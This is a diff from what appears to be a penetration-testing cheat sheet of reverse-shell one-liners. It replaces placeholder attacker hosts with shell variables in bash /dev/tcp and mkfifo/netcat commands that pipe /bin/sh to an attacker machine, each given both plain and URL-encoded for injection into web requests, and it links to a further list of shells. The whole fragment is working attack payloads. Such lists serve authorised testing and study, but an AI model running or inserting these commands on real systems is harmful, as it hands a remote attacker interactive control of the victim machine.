@@ -31,10 +31,10 @@ cmd> powershell -enc xyz
 ## Bash 
 
 ```
-bash -c "bash -i >& /dev/tcp/ip/port 0>&1"
-bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2Fport%200%3E%261%22
-rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc AttackerIP AttackePort > /tmp/f
-rm%20%2Ftmp%2Ff%20%3B%20mkfifo%20%2Ftmp%2Ff%20%3B%20cat%20%2Ftmp%2Ff%20%7C%20%2Fbin%2Fsh%20-i%202%3E%261%20%7C%20nc%20AttackerIP%20AttackePort%20%3E%20%2Ftmp%2Ff
+bash -c "bash -i >& /dev/tcp/$AttackerIp/$AttackerPort 0>&1"
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$AttackerIp%2F$AttackerPort%200%3E%261%22
+rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc $AttackerIP $AttackePort > /tmp/f
+rm%20%2Ftmp%2Ff%20%3B%20mkfifo%20%2Ftmp%2Ff%20%3B%20cat%20%2Ftmp%2Ff%20%7C%20%2Fbin%2Fsh%20-i%202%3E%261%20%7C%20nc%20$AttackerIP%20$AttackePort%20%3E%20%2Ftmp%2Ff
 ```
 Other shells: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
